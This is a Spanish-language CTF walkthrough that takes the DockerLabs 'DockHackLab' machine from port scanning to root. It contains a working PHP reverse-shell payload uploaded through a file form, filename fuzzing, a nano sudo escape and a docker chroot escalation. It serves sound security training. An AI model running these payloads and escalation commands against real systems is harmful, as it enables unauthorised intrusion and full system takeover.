# DockHackLab DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip dockhacklab.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh dockhacklab.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 09:55 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000064s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9a:a2:73:65:c5:4f:dd:36:57:7c:53:f6:98:82:96:04 (ECDSA)
|_  256 c5:f4:bf:93:53:a3:8b:78:0c:8a:b2:fa:30:5b:b3:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.06 seconds
```

Si vamos al puerto `80` vemos que esta por defecto el `apache2` por lo que haremos un poco de `fuzzing`:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10671]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/hackademy            (Status: 200) [Size: 1261]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesantes, entre ellas una llamada `/hackademy`.

## Escalate user www-data

Si nos metemos en la siguiente ruta:

```
URL = http://<IP>/hackademy
```

Veremos una pagina en la que podremos subir un archivo, por lo que subiremos uno `.php` para crearnos una `reverse shell`.

> exploit.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Si probamos a subirlo veremos esto:

```
El archivo exploit.php ha sido subido y alterado xxx_tuarchivo , localizalo y actua.
```

Por lo que vemos se subio correctamente, pero el nombre ha cambiado, por lo que tendremos que hacer fuzzing para ver que nombre tiene ahora delante del nombre que le pusimos mas cualquier tipo de caracteres, por lo que nos montaremos un script.

> script.py

```python
from itertools import product

def generar_combinaciones_y_guardar(base, reemplazo, archivo_salida):
    """
    Genera todas las combinaciones reemplazando 'xxx' con combinaciones de tres letras del abecedario
    y las guarda en un archivo de texto.
    """
    alfabeto = 'abcdefghijklmnopqrstuvwxyz'
    with open(archivo_salida, 'w') as archivo:
        for letras in product(alfabeto, repeat=3):
            combinacion_reemplazo = ''.join(letras)
            combinacion = base.replace(reemplazo, combinacion_reemplazo)
            archivo.write(combinacion + '\n')
    print(f"Combinaciones generadas y guardadas en {archivo_salida}")

# Configuración inicial
base_palabra = "xxx_exploit"
reemplazo = "xxx"
archivo_salida = "combinaciones.txt"

# Generar combinaciones y guardarlas en un archivo
generar_combinaciones_y_guardar(base_palabra, reemplazo, archivo_salida)
```

Y esto generara un diccionario de palabras `.txt` el cual utilizaremos para hacer `fuzzing` con `gobuster`.

```shell
gobuster dir -u http://<IP>/hackademy -w combinaciones.txt -x php -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/hackademy
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                combinaciones.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/klp_exploit.php      (Status: 500) [Size: 0]
Progress: 35152 / 35154 (99.99%)
===============================================================
Finished
===============================================================
```

Vemos que hemos encontrado el archivo, por lo que nos pondremos a la escucha de la siguiente forma:

```shell
nc -lvnp <IP>
```

Y nos metemos en la siguiente ruta:

```
URL = http://<IP>/hackademy/klp_exploit.php
```

Y si nos vamos donde teniamos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 35264
whoami
www-data
```

### Sanitizacion de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user firsthacking

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on 9a87d77f85e6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 9a87d77f85e6:
    (firsthacking) NOPASSWD: /usr/bin/nano
```

Vemos que podemos ejecutar el binario `nano` como el usuario `firsthacking`, por lo que haremos lo siguiente:

```shell
sudo -u firsthacking nano
^R^X
reset; bash 1>&0 2>&0
```

Y con esto ya seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for firsthacking on 9a87d77f85e6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User firsthacking may run the following commands on 9a87d77f85e6:
    (ALL) NOPASSWD: /usr/bin/docker
```

Vemos que podemos ejecutar el binario `docker` como el usuario `root`, por lo que haremos lo siguiente:

```shell
docker
```

Info:

```
docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?.
```

Vemos que el `docker` no esta levantado, por lo que investigaremos un poco mas para ver como levantarlo.

Si leemos en nuestra `home` el siguiente archivo:

```shell
cat .docker
```

Info:

```
que utiles son las funciones del bashrc
```

Vemos que nos da una pista en el archivo `.bashrc`, por lo que investigaremos que encontramos ahi.

Si vemos las ultimas lineas del archivo, veremos lo siguiente:

```
function docker() {
    echo "�Fijate que hay algo esperando a que llames"
    echo -e "\n 12345 54321 24680 13579 \n"
    echo -e "De nada servira si no llamas antes"
}
```

Por lo que vemos podremos hacer un `portknocking` ya que al parecer el servicio del `docker` estara filtrado, y lo haremos de la siguiente forma:

Desde neustro `kali` haremos esto:

```shell
knock <IP> 12345 54321 24680 13579
```

Y una vez echo esto, nos iremos a la maquina de nuevo y pondremos esto:

```shell
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Info:

```
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
1f3e46996e29: Pull complete 
Digest: sha256:56fa17d2a7e7f168a043a2712e63aed1f8543aeafdcee47c58dcffe38ed51099
Status: Downloaded newer image for alpine:latest
# whoami
root
```

Y con esto ya seremos `root` por lo que la habremos terminado.
